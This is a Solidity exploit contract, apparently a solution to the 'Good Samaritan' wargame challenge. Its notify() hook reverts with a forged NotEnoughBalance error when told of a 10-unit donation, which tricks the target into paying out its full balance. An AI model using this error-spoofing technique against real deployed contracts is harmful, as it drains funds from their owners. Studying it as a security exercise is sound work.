//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}

contract Attack {
    IGoodSamaritan immutable goodSamaritan;
    
    error NotEnoughBalance();

    constructor(IGoodSamaritan _goodSamaritan) payable {
        goodSamaritan = _goodSamaritan;
    }

    function requestDonation() external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        // revert the first call and ignore the second one
        if (amount == 10) {
            revert NotEnoughBalance(); 
        }
    }
}


















